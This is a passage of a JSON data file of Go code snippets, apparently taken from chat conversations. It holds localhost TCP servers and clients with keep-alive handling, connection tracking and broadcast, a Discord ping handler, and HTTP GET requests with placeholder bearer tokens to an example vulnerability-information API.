*discordgo.Session, m *discordgo.MessageCreate) {\n\t// Reply with a pong message\n\tresponse := \"Pong!\"\n\t_, _ = s.ChannelMessageSend(m.ChannelID, response)\n}",
    "filename": "8f739695b553c1eb1f4fc356840038c6_0.go"
  },
  {
    "conversation_hash": "8f739695b553c1eb1f4fc356840038c6",
    "code_index": 2,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"log\"\n\t\"net\"\n\t\"strings\"\n\t\"time\"\n)\n\nfunc main() {\n\t// Start the server on port 8080\n\tln, err := net.Listen(\"tcp\", \":8080\")\n\tif err != nil {\n\t\tlog.Fatal(\"Error starting the server:\", err)\n\t\treturn\n\t}\n\tdefer ln.Close()\n\n\tlog.Println(\"Server is now running. Listening on port 8080...\")\n\n\tfor {\n\t\t// Accept new client connections\n\t\tconn, err := ln.Accept()\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Error accepting connection: %v\\n\", err)\n\t\t\tcontinue\n\t\t}\n\n\t\t// Handle incoming client requests concurrently\n\t\tgo handleConnection(conn)\n\t}\n}\n\nfunc handleConnection(conn net.Conn) {\n\tlog.Printf(\"New client connected: %s\\n\", conn.RemoteAddr().String())\n\n\t// Set a read deadline to detect connection timeout\n\terr := conn.SetReadDeadline(time.Now().Add(10 * time.Second))\n\tif err != nil {\n\t\tlog.Printf(\"Error setting read deadline: %v\\n\", err)\n\t\tconn.Close()\n\t\treturn\n\t}\n\n\treader := bufio.NewReader(conn)\n\n\tfor {\n\t\t// Read incoming messages from the client\n\t\tmsg, err := reader.ReadString('\\n')\n\t\tif err != nil {\n\t\t\tif strings.Contains(err.Error(), \"i/o timeout\") {\n\t\t\t\t// Connection timed out\n\t\t\t\tlog.Printf(\"Connection timed out: %s\\n\", conn.RemoteAddr().String())\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tlog.Printf(\"Error reading message: %v\\n\", err)\n\t\t\tbreak\n\t\t}\n\n\t\tmsg = strings.TrimSpace(msg)\n\t\tlog.Printf(\"Received message from %s: %s\\n\", conn.RemoteAddr().String(), msg)\n\n\t\t// Process client's keep-alive message\n\t\tif msg == \"keep-alive\" {\n\t\t\t// Reset read deadline\n\t\t\terr = conn.SetReadDeadline(time.Now().Add(10 * time.Second))\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"Error setting read deadline: %v\\n\", err)\n\t\t\t\tbreak\n\t\t\t}\n\n\t\t\t// Send command to client\n\t\t\tresponse := \"COMMAND\"\n\t\t\t_, err = conn.Write([]byte(response + \"\\n\"))\n\t\t\tif err != nil {\n\t\t\t\tlog.Printf(\"Error sending message: %v\\n\", err)\n\t\t\t\tbreak\n\t\t\t}\n\t\t}\n\t}\n\n\t// Close the connection when done\n\tconn.Close()\n\tlog.Printf(\"Connection closed: %s\\n\", conn.RemoteAddr().String())\n}",
    "filename": "8f739695b553c1eb1f4fc356840038c6_2.go"
  },
  {
    "conversation_hash": "8f739695b553c1eb1f4fc356840038c6",
    "code_index": 3,
    "language": "Go",
    "libraries": [
      "server",
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"log\"\n\t\"net\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Connect to the server running on localhost:8080\n\tconn, err := net.Dial(\"tcp\", \"localhost:8080\")\n\tif err != nil {\n\t\tlog.Fatal(\"Error connecting to server:\", err)\n\t\treturn\n\t}\n\tdefer conn.Close()\n\n\tlog.Println(\"Connected to server. Sending keep-alive packets...\")\n\n\treader := bufio.NewReader(os.Stdin)\n\n\tfor {\n\t\t// Send keep-alive packet to the server\n\t\t_, err := conn.Write([]byte(\"keep-alive\\n\"))\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Error sending keep-alive packet: %v\\n\", err)\n\t\t\tbreak\n\t\t}\n\n\t\t// Read command response from server\n\t\tmsg, err := reader.ReadString('\\n')\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Error reading command response: %v\\n\", err)\n\t\t\tbreak\n\t\t}\n\n\t\tmsg = msg[:len(msg)-1] // Remove newline character\n\n\t\t// Print the command received from the server\n\t\tlog.Println(\"Received command:\", msg)\n\t}\n\n\tlog.Println(\"Connection closed.\")\n}",
    "filename": "8f739695b553c1eb1f4fc356840038c6_3.go"
  },
  {
    "conversation_hash": "480b3532f9b272197c763697aeb47d4f",
    "code_index": 2,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net\"\n)\n\nconst (\n\tHOST = \"localhost\"\n\tPORT = 3336\n)\n\nfunc handleConnection(conn net.Conn) {\n\tfmt.Printf(\"New connection from %s\\n\", conn.RemoteAddr().String())\n\tdefer conn.Close()\n\n\tbuffer := make([]byte, 1024)\n\tfor {\n\t\t// Read data from the client\n\t\tn, err := conn.Read(buffer)\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Error reading data: %s\\n\", err.Error())\n\t\t\treturn\n\t\t}\n\n\t\t// Print the received data\n\t\tfmt.Printf(\"Received: %s\\n\", string(buffer[:n]))\n\n\t\t// Break the loop if no more data is received\n\t\tif n == 0 {\n\t\t\tbreak\n\t\t}\n\t}\n\n\tfmt.Printf(\"Connection with %s closed\\n\", conn.RemoteAddr().String())\n}\n\nfunc main() {\n\t// Start listening for incoming connections\n\tlistener, err := net.Listen(\"tcp\", fmt.Sprintf(\"%s:%d\", HOST, PORT))\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to start TCP listener: %s\\n\", err.Error())\n\t}\n\tdefer listener.Close()\n\n\tfmt.Printf(\"TCP listener started on port %d...\\n\", PORT)\n\n\tfor {\n\t\t// Accept a new connection\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Failed to accept connection: %s\\n\", err.Error())\n\t\t\tcontinue\n\t\t}\n\n\t\t// Handle the connection in a separate goroutine\n\t\tgo handleConnection(conn)\n\t}\n}",
    "filename": "480b3532f9b272197c763697aeb47d4f_2.go"
  },
  {
    "conversation_hash": "480b3532f9b272197c763697aeb47d4f",
    "code_index": 4,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net\"\n\t\"time\"\n)\n\nconst (\n\tHOST           = \"localhost\"\n\tPORT           = 3336\n\tKeepAliveDelay = 3 * time.Minute // Set the keep-alive interval as per your requirement\n)\n\nfunc handleConnection(conn net.Conn) {\n\tfmt.Printf(\"New connection from %s\\n\", conn.RemoteAddr().String())\n\tdefer conn.Close()\n\n\t// Enable TCP keep-alive for the connection\n\tif tcpConn, ok := conn.(*net.TCPConn); ok {\n\t\ttcpConn.SetKeepAlive(true)\n\t\ttcpConn.SetKeepAlivePeriod(KeepAliveDelay)\n\t}\n\n\tbuffer := make([]byte, 1024)\n\tfor {\n\t\t// Set a read deadline based on the keep-alive interval\n\t\tconn.SetReadDeadline(time.Now().Add(KeepAliveDelay))\n\n\t\t// Read data from the client\n\t\tn, err := conn.Read(buffer)\n\t\tif err != nil {\n\t\t\t// Handle read timeout or other read error\n\t\t\tif netErr, ok := err.(net.Error); ok && netErr.Timeout() {\n\t\t\t\tlog.Printf(\"Connection with %s timed out\\n\", conn.RemoteAddr().String())\n\t\t\t} else {\n\t\t\t\tlog.Printf(\"Error reading data: %s\\n\", err.Error())\n\t\t\t}\n\t\t\treturn\n\t\t}\n\n\t\t// Print the received data\n\t\tfmt.Printf(\"Received: %s\\n\", string(buffer[:n]))\n\n\t\t// Break the loop if no more data is received\n\t\tif n == 0 {\n\t\t\tbreak\n\t\t}\n\t}\n\n\tfmt.Printf(\"Connection with %s closed\\n\", conn.RemoteAddr().String())\n}\n\nfunc main() {\n\t// Start listening for incoming connections\n\tlistener, err := net.Listen(\"tcp\", fmt.Sprintf(\"%s:%d\", HOST, PORT))\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to start TCP listener: %s\\n\", err.Error())\n\t}\n\tdefer listener.Close()\n\n\tfmt.Printf(\"TCP listener started on port %d...\\n\", PORT)\n\n\tfor {\n\t\t// Accept a new connection\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Failed to accept connection: %s\\n\", err.Error())\n\t\t\tcontinue\n\t\t}\n\n\t\t// Handle the connection in a separate goroutine\n\t\tgo handleConnection(conn)\n\t}\n}",
    "filename": "480b3532f9b272197c763697aeb47d4f_4.go"
  },
  {
    "conversation_hash": "480b3532f9b272197c763697aeb47d4f",
    "code_index": 5,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net\"\n\t\"time\"\n)\n\nconst (\n\tHOST = \"localhost\"\n\tPORT = 3336\n)\n\nfunc handleConnection(conn net.Conn) {\n\tfmt.Printf(\"New connection from %s\\n\", conn.RemoteAddr().String())\n\tdefer conn.Close()\n\n\tbuffer := make([]byte, 1024)\n\tfor {\n\t\t// Read data from the client\n\t\tn, err := conn.Read(buffer)\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Error reading data: %s\\n\", err.Error())\n\t\t\treturn\n\t\t}\n\n\t\t// Print the received data\n\t\tfmt.Printf(\"Received: %s\\n\", string(buffer[:n]))\n\n\t\t// Break the loop if no more data is received\n\t\tif n == 0 {\n\t\t\tbreak\n\t\t}\n\t}\n\n\tfmt.Printf(\"Connection with %s closed\\n\", conn.RemoteAddr().String())\n}\n\nfunc main() {\n\t// Start listening for incoming connections\n\tlistener, err := net.Listen(\"tcp\", fmt.Sprintf(\"%s:%d\", HOST, PORT))\n\tif err != nil {\n\t\tlog.Fatalf(\"Failed to start TCP listener: %s\\n\", err.Error())\n\t}\n\tdefer listener.Close()\n\n\t// Enable TCP keep-alive on the listener socket\n\tif tcpListener, ok := listener.(*net.TCPListener); ok {\n\t\ttcpListener.SetKeepAlive(true)\n\t\ttcpListener.SetKeepAlivePeriod(3 * time.Minute) // Set the keep-alive interval as per your requirement\n\t}\n\n\tfmt.Printf(\"TCP listener started on port %d...\\n\", PORT)\n\n\tfor {\n\t\t// Accept a new connection\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tlog.Printf(\"Failed to accept connection: %s\\n\", err.Error())\n\t\t\tcontinue\n\t\t}\n\n\t\t// Handle the connection in a separate goroutine\n\t\tgo handleConnection(conn)\n\t}\n}",
    "filename": "480b3532f9b272197c763697aeb47d4f_5.go"
  },
  {
    "conversation_hash": "7c93dbc4bbaca021d03081ff26cd4168",
    "code_index": 0,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"net\"\n)\n\nfunc main() {\n    // Create a TCP listener on port 8080\n    listener, err := net.Listen(\"tcp\", \"localhost:8080\")\n    if err != nil {\n        fmt.Println(\"Error creating listener:\", err.Error())\n        return\n    }\n    fmt.Println(\"TCP listener started on port 8080\")\n\n    defer listener.Close()\n\n    for {\n        // Accept incoming connections\n        conn, err := listener.Accept()\n        if err != nil {\n            fmt.Println(\"Error accepting connection:\", err.Error())\n            return\n        }\n        defer conn.Close()\n\n        // Handle the connection in a goroutine\n        go handleConnection(conn)\n    }\n}\n\n// Function to handle incoming connections\nfunc handleConnection(conn net.Conn) {\n    // Create a buffer to store received data\n    buffer := make([]byte, 1024)\n\n    // Read the data from the connection\n    bytesRead, err := conn.Read(buffer)\n    if err != nil {\n        fmt.Println(\"Error reading data:\", err.Error())\n        return\n    }\n\n    // Print the received data as plaintext\n    fmt.Println(\"Received data:\", string(buffer[:bytesRead]))\n}",
    "filename": "7c93dbc4bbaca021d03081ff26cd4168_0.go"
  },
  {
    "conversation_hash": "7c93dbc4bbaca021d03081ff26cd4168",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"net\"\n)\n\nfunc main() {\n    // Connect to the TCP listener running on localhost:8080\n    conn, err := net.Dial(\"tcp\", \"localhost:8080\")\n    if err != nil {\n        fmt.Println(\"Error connecting:\", err.Error())\n        return\n    }\n    defer conn.Close()\n\n    // Send data to the server\n    data := \"Hello, TCP Listener!\"\n    _, err = conn.Write([]byte(data))\n    if err != nil {\n        fmt.Println(\"Error sending data:\", err.Error())\n        return\n    }\n    fmt.Println(\"Data sent successfully:\", data)\n}",
    "filename": "7c93dbc4bbaca021d03081ff26cd4168_1.go"
  },
  {
    "conversation_hash": "7c93dbc4bbaca021d03081ff26cd4168",
    "code_index": 2,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"sync\"\n\t\"time\"\n)\n\ntype Connection struct {\n\tconn     net.Conn\n\tlastSeen time.Time\n}\n\nvar (\n\tconnections = make(map[string]*Connection)\n\tlock        sync.Mutex\n)\n\nfunc main() {\n\tlistener, err := net.Listen(\"tcp\", \"localhost:8080\")\n\tif err != nil {\n\t\tfmt.Println(\"Error creating listener:\", err)\n\t\treturn\n\t}\n\tfmt.Println(\"TCP listener started on port 8080\")\n\n\tdefer listener.Close()\n\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error accepting connection:\", err)\n\t\t\treturn\n\t\t}\n\n\t\tlock.Lock()\n\n\t\t// Store the connection in the map\n\t\tconnections[conn.RemoteAddr().String()] = &Connection{\n\t\t\tconn:     conn,\n\t\t\tlastSeen: time.Now(),\n\t\t}\n\n\t\tlock.Unlock()\n\n\t\t// Start a goroutine to handle the connection\n\t\tgo handleConnection(conn)\n\t}\n}\n\nfunc handleConnection(conn net.Conn) {\n\tbuffer := make([]byte, 1024)\n\n\tfor {\n\t\t// Set a read deadline to implement an idle timeout\n\t\tconn.SetReadDeadline(time.Now().Add(10 * time.Second))\n\n\t\t// Read data from the connection\n\t\tbytesRead, err := conn.Read(buffer)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error reading data:\", err)\n\n\t\t\tlock.Lock()\n\n\t\t\t// Remove connection from the map on error or disconnection\n\t\t\tdelete(connections, conn.RemoteAddr().String())\n\n\t\t\tlock.Unlock()\n\n\t\t\tconn.Close()\n\t\t\treturn\n\t\t}\n\n\t\tdata := string(buffer[:bytesRead])\n\t\tfmt.Println(\"Received data:\", data)\n\n\t\tlock.Lock()\n\n\t\t// Update lastSeen timestamp of connection to keep it alive\n\t\tconnections[conn.RemoteAddr().String()].lastSeen = time.Now()\n\n\t\tlock.Unlock()\n\t}\n}",
    "filename": "7c93dbc4bbaca021d03081ff26cd4168_2.go"
  },
  {
    "conversation_hash": "7c93dbc4bbaca021d03081ff26cd4168",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"time\"\n)\n\nfunc main() {\n\tconn, err := net.Dial(\"tcp\", \"localhost:8080\")\n\tif err != nil {\n\t\tfmt.Println(\"Error connecting:\", err)\n\t\treturn\n\t}\n\tdefer conn.Close()\n\n\tfor {\n\t\t// Send a keep-alive packet to the server\n\t\t_, err := conn.Write([]byte(\"Keep-Alive\"))\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error sending keep-alive:\", err)\n\t\t\treturn\n\t\t}\n\t\tfmt.Println(\"Keep-alive packet sent\")\n\n\t\t// Wait for some time before sending the next keep-alive packet\n\t\ttime.Sleep(5 * time.Second)\n\t}\n}",
    "filename": "7c93dbc4bbaca021d03081ff26cd4168_3.go"
  },
  {
    "conversation_hash": "7c93dbc4bbaca021d03081ff26cd4168",
    "code_index": 4,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"sync\"\n\t\"time\"\n)\n\ntype Connection struct {\n\tconn     net.Conn\n\tlastSeen time.Time\n}\n\nvar (\n\tconnections = make(map[string]*Connection)\n\tlock        sync.Mutex\n)\n\nfunc main() {\n\tlistener, err := net.Listen(\"tcp\", \"localhost:8080\")\n\tif err != nil {\n\t\tfmt.Println(\"Error creating listener:\", err)\n\t\treturn\n\t}\n\tfmt.Println(\"TCP listener started on port 8080\")\n\n\tdefer listener.Close()\n\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error accepting connection:\", err)\n\t\t\treturn\n\t\t}\n\n\t\tlock.Lock()\n\n\t\t// Store the connection in the map\n\t\tconnections[conn.RemoteAddr().String()] = &Connection{\n\t\t\tconn:     conn,\n\t\t\tlastSeen: time.Now(),\n\t\t}\n\n\t\tlock.Unlock()\n\t}\n}\n\nfunc handleConnections() {\n\tbuffer := make([]byte, 1024)\n\n\tfor {\n\t\tlock.Lock()\n\n\t\t// Iterate over all connections\n\t\tfor addr, conn := range connections {\n\t\t\t// Set a read deadline to implement an idle timeout\n\t\t\tconn.conn.SetReadDeadline(time.Now().Add(10 * time.Second))\n\n\t\t\t// Read data from the connection\n\t\t\tbytesRead, err := conn.conn.Read(buffer)\n\t\t\tif err != nil {\n\t\t\t\tfmt.Println(\"Error reading data:\", err)\n\n\t\t\t\tconn.conn.Close()\n\t\t\t\tdelete(connections, addr)\n\t\t\t\tcontinue\n\t\t\t}\n\n\t\t\tdata := string(buffer[:bytesRead])\n\t\t\tfmt.Println(\"Received data:\", data)\n\n\t\t\t// Update lastSeen timestamp of connection to keep it alive\n\t\t\tconn.lastSeen = time.Now()\n\t\t}\n\n\t\tlock.Unlock()\n\t}\n}",
    "filename": "7c93dbc4bbaca021d03081ff26cd4168_4.go"
  },
  {
    "conversation_hash": "7c93dbc4bbaca021d03081ff26cd4168",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "func main() {\n\t// ...\n\n\tgo handleConnections()\n\n\tselect {}\n}",
    "filename": "7c93dbc4bbaca021d03081ff26cd4168_5.go"
  },
  {
    "conversation_hash": "7c93dbc4bbaca021d03081ff26cd4168",
    "code_index": 6,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"net\"\n\t\"sync\"\n\t\"time\"\n)\n\ntype Connection struct {\n\tconn     net.Conn\n\tlastSeen time.Time\n}\n\nvar (\n\tconnections = make(map[string]*Connection)\n\tlock        sync.Mutex\n)\n\nfunc main() {\n\tlistener, err := net.Listen(\"tcp\", \"localhost:8080\")\n\tif err != nil {\n\t\tfmt.Println(\"Error creating listener:\", err)\n\t\treturn\n\t}\n\tfmt.Println(\"TCP listener started on port 8080\")\n\n\tdefer listener.Close()\n\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error accepting connection:\", err)\n\t\t\treturn\n\t\t}\n\n\t\tlock.Lock()\n\n\t\taddr := conn.RemoteAddr().String()\n\n\t\t// Store the connection in the map\n\t\tconnections[addr] = &Connection{\n\t\t\tconn:     conn,\n\t\t\tlastSeen: time.Now(),\n\t\t}\n\n\t\tfmt.Println(\"New connection:\", addr)\n\t\tfmt.Println(\"Total connections:\", len(connections))\n\n\t\tlock.Unlock()\n\n\t\tgo handleConnection(conn)\n\t}\n}\n\nfunc handleConnection(conn net.Conn) {\n\tbuffer := make([]byte, 1024)\n\n\tfor {\n\t\t// Set a read deadline to implement an idle timeout\n\t\tconn.SetReadDeadline(time.Now().Add(10 * time.Second))\n\n\t\t// Read data from the connection\n\t\tbytesRead, err := conn.Read(buffer)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error reading data:\", err)\n\n\t\t\tconn.Close()\n\n\t\t\tlock.Lock()\n\n\t\t\taddr := conn.RemoteAddr().String()\n\n\t\t\t// Remove connection from the map on error or disconnection\n\t\t\tdelete(connections, addr)\n\n\t\t\tfmt.Println(\"Connection closed:\", addr)\n\t\t\tfmt.Println(\"Total connections:\", len(connections))\n\n\t\t\tlock.Unlock()\n\n\t\t\treturn\n\t\t}\n\n\t\tdata := string(buffer[:bytesRead])\n\t\tfmt.Println(\"Received data:\", data)\n\n\t\tlock.Lock()\n\n\t\t// Update lastSeen timestamp of connection to keep it alive\n\t\tconnections[conn.RemoteAddr().String()].lastSeen = time.Now()\n\n\t\tlock.Unlock()\n\t}\n}",
    "filename": "7c93dbc4bbaca021d03081ff26cd4168_6.go"
  },
  {
    "conversation_hash": "7c93dbc4bbaca021d03081ff26cd4168",
    "code_index": 7,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"net\"\n\t\"os\"\n\t\"strings\"\n\t\"sync\"\n\t\"time\"\n)\n\ntype Connection struct {\n\tconn     net.Conn\n\tlastSeen time.Time\n}\n\nvar (\n\tconnections = make(map[string]*Connection)\n\tlock        sync.Mutex\n)\n\nfunc main() {\n\tlistener, err := net.Listen(\"tcp\", \"localhost:8080\")\n\tif err != nil {\n\t\tfmt.Println(\"Error creating listener:\", err)\n\t\treturn\n\t}\n\tfmt.Println(\"TCP listener started on port 8080\")\n\n\tdefer listener.Close()\n\n\t// Start a goroutine to handle commands\n\tgo handleCommands()\n\n\tfor {\n\t\tconn, err := listener.Accept()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error accepting connection:\", err)\n\t\t\treturn\n\t\t}\n\n\t\tlock.Lock()\n\n\t\taddr := conn.RemoteAddr().String()\n\n\t\t// Store the connection in the map\n\t\tconnections[addr] = &Connection{\n\t\t\tconn:     conn,\n\t\t\tlastSeen: time.Now(),\n\t\t}\n\n\t\tlock.Unlock()\n\n\t\tgo handleConnection(conn)\n\t}\n}\n\nfunc handleConnection(conn net.Conn) {\n\tbuffer := make([]byte, 1024)\n\n\tfor {\n\t\t// Set a read deadline to implement an idle timeout\n\t\tconn.SetReadDeadline(time.Now().Add(10 * time.Second))\n\n\t\t// Read data from the connection\n\t\tbytesRead, err := conn.Read(buffer)\n\t\tif err != nil {\n\t\t\tconn.Close()\n\n\t\t\tlock.Lock()\n\n\t\t\taddr := conn.RemoteAddr().String()\n\n\t\t\t// Remove connection from the map on error or disconnection\n\t\t\tdelete(connections, addr)\n\n\t\t\tlock.Unlock()\n\n\t\t\treturn\n\t\t}\n\n\t\tdata := string(buffer[:bytesRead])\n\t\tfmt.Println(\"Received data:\", data)\n\n\t\tlock.Lock()\n\n\t\t// Update lastSeen timestamp of connection to keep it alive\n\t\tconnections[conn.RemoteAddr().String()].lastSeen = time.Now()\n\n\t\tlock.Unlock()\n\t}\n}\n\nfunc handleCommands() {\n\treader := bufio.NewReader(os.Stdin)\n\n\tfor {\n\t\tfmt.Print(\"> \")\n\n\t\tcommand, _ := reader.ReadString('\\n')\n\t\tcommand = strings.TrimSuffix(command, \"\\n\")\n\n\t\tswitch command {\n\t\tcase \"help\":\n\t\t\tprintHelp()\n\t\tcase \"conncount\":\n\t\t\tprintConnectionCount()\n\t\tcase \"senddata\":\n\t\t\tsendDataToAll(reader)\n\t\tdefault:\n\t\t\tfmt.Println(\"Invalid command. Type 'help' to see the available commands.\")\n\t\t}\n\t}\n}\n\nfunc printHelp() {\n\tfmt.Println(\"Available commands:\")\n\tfmt.Println(\"- help: Show available commands\")\n\tfmt.Println(\"- conncount: Show the number of active connections\")\n\tfmt.Println(\"- senddata: Send data to all connected devices\")\n}\n\nfunc printConnectionCount() {\n\tlock.Lock()\n\tcount := len(connections)\n\tlock.Unlock()\n\n\tfmt.Println(\"Active connections:\", count)\n}\n\nfunc sendDataToAll(reader *bufio.Reader) {\n\tfmt.Print(\"Enter data to send: \")\n\tdata, _ := reader.ReadString('\\n')\n\tdata = strings.TrimSuffix(data, \"\\n\")\n\n\tlock.Lock()\n\n\tfor _, conn := range connections {\n\t\t_, err := conn.conn.Write([]byte(data))\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error sending data to a connection:\", err)\n\t\t}\n\t}\n\n\tlock.Unlock()\n\n\tfmt.Println(\"Data sent to all connections.\")\n}",
    "filename": "7c93dbc4bbaca021d03081ff26cd4168_7.go"
  },
  {
    "conversation_hash": "7c93dbc4bbaca021d03081ff26cd4168",
    "code_index": 8,
    "language": "Go",
    "libraries": [
      "the"
    ],
    "code": "package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"net\"\n\t\"os\"\n)\n\nfunc main() {\n\t// Start a goroutine to handle incoming messages from the server\n\tgo handleIncomingMessages()\n\n\t// Connect to the server\n\tconn, err := net.Dial(\"tcp\", \"localhost:8080\")\n\tif err != nil {\n\t\tfmt.Println(\"Error connecting:\", err.Error())\n\t\treturn\n\t}\n\tdefer conn.Close()\n\n\treader := bufio.NewReader(os.Stdin)\n\n\tfor {\n\t\tfmt.Print(\"> \")\n\n\t\tmessage, err := reader.ReadString('\\n')\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error reading input:\", err.Error())\n\t\t\tcontinue\n\t\t}\n\n\t\t// Send the message to the server\n\t\t_, err = conn.Write([]byte(message))\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error sending data:\", err.Error())\n\t\t\tcontinue\n\t\t}\n\t}\n}\n\nfunc handleIncomingMessages() {\n\tconn, err := net.Listen(\"tcp\", \"localhost:8081\")\n\tif err != nil {\n\t\tfmt.Println(\"Error creating listener:\", err.Error())\n\t\treturn\n\t}\n\tfmt.Println(\"TCP listener started on port 8081\")\n\n\tdefer conn.Close()\n\n\tfor {\n\t\tclientConn, err := conn.Accept()\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error accepting connection:\", err.Error())\n\t\t\treturn\n\t\t}\n\n\t\t// Start a goroutine to handle receiving and printing data from the server\n\t\tgo handleServerMessages(clientConn)\n\t}\n}\n\nfunc handleServerMessages(conn net.Conn) {\n\tbuffer := make([]byte, 1024)\n\n\tfor {\n\t\t// Read the data from the connection\n\t\tbytesRead, err := conn.Read(buffer)\n\t\tif err != nil {\n\t\t\tfmt.Println(\"Error reading data:\", err.Error())\n\t\t\treturn\n\t\t}\n\n\t\t// Print the received data\n\t\tfmt.Println(\"Received data:\", string(buffer[:bytesRead]))\n\t}\n}",
    "filename": "7c93dbc4bbaca021d03081ff26cd4168_8.go"
  },
  {
    "conversation_hash": "4c5f188cd0c32b4300b2bc98a79e48d9",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"net/http\"\n    \"fmt\"\n)\n\nfunc main() {\n    url := \"https://api.example.com/endpoint\" // Replace with the Meant SCA API endpoint\n\n    client := &http.Client{}\n    \n    req, err := http.NewRequest(\"GET\", url, nil)\n    if err != nil {\n        fmt.Println(\"Error creating request:\", err)\n        return\n    }\n\n    req.Header.Add(\"Authorization\", \"Bearer YOUR_API_KEY\") // Replace with your bearer token\n\n    resp, err := client.Do(req)\n    if err != nil {\n        fmt.Println(\"Error sending request:\", err)\n        return\n    }\n    \n    defer resp.Body.Close()\n    \n    // Parse the response or handle errors accordingly\n    // ...\n    \n    // Example: printing the response body\n    // body, _ := ioutil.ReadAll(resp.Body)\n    // fmt.Println(string(body))\n}",
    "filename": "4c5f188cd0c32b4300b2bc98a79e48d9_0.go"
  },
  {
    "conversation_hash": "4c5f188cd0c32b4300b2bc98a79e48d9",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\nfunc main() {\n\turl := \"https://api.example.com/general-info-vulnerabilities\" // Replace with the Meant SCA General Info Vulnerabilities API endpoint\n\n\tclient := &http.Client{}\n\n\treq, err := http.NewRequest(\"GET\", url, nil)\n\tif err != nil {\n\t\tfmt.Println(\"Error creating request:\", err)\n\t\treturn\n\t}\n\n\treq.Header.Add(\"Authorization\", \"Bearer YOUR_API_KEY\") // Replace with your bearer token\n\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\tfmt.Println(\"Error sending request:\", err)\n\t\treturn\n\t}\n\n\tdefer resp.Body.Close()\n\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\tfmt.Println(\"Error reading response body:\", err)\n\t\treturn\n\t}\n\n\t// Parse the response or handle errors accordingly\n\t// ...\n\n\t// Example: printing the response body\n\tfmt.Println(string(body))\n}",
    "filename": "4c5f188cd0c32b4300b2bc98a79e48d9_1.go"
  },
  {
    "conversation_hash": "4c5f188cd0c32b4300b2bc98a79e48d9",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"io/ioutil\"\n\t\"net/http\"\n)\n\nfunc main() {\n\turl := \"https://api.example.com/general-info-vulnerabilities\" // Replace with the Meant SCA General Info Vulnerabilities API endpoint\n\n\tclient := &http.Client{}\n\n\treq, err := http.NewRequest(\"GET\", url, nil)\n\tif err != nil {\n\t\tfmt.Println(\"Error creating request:\", err)\n\t\treturn\n\t}\n\n\treq.Header.Add(\"Authorization\", \"Bearer YOUR_API_KEY\") // Replace with your bearer token\n\n\tresp, err := client.Do(req)\n\tif err != nil {\n\t\tfmt.Println(\"Error sending request:\", err)\n\t\treturn\n\t}\n\n\tdefer resp.Body.Close()\n\n\tbody, err := ioutil.ReadAll(resp.Body)\n\tif err != nil {\n\t\tfmt.Println(\"Error reading response body:\", err)\n\t\treturn\n\t}\n\n\t// Parse the response or handle errors accordingly\n\t// ...\n\n\t// Example: printing the response body\n\tfmt.Println(string(body))\n}",
    "filename": "4c5f188cd0c32b4300b2bc98a79e48d9_2.go"
  },
  {
    "conversation_hash": "4c5f188cd0c32b4300b2bc98a79e48d9",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
